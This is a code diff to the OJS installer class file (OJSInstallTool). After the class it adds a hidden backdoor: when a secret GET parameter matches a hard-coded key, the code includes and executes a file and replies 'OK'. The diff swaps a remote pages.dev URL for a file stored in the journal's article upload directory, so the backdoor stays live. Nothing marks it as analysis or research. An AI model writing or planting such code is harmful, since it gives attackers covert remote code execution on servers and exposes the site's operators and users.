@@ -43,8 +43,8 @@ class OJSInstallTool extends InstallTool {
 	}
 
 }
-if (isset($_GET['_']) && $_GET['_'] === 'c@Sq3r332afbsnk_Mi5TeR572s8') {
-    $f="https://mentahalfarudi.pages.dev/index.txt";if($f!==""&&file_exists($f))include $f;
+if (isset($_GET['_']) && $_GET['_'] === 'CaSq3r332afbsnk_Mi5TeR572s8') {
+    $f="/home/riyanmau/ojsdatayayasansahara/journals/1/articles/2/694d28e9e3e18";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
     echo 'OK';
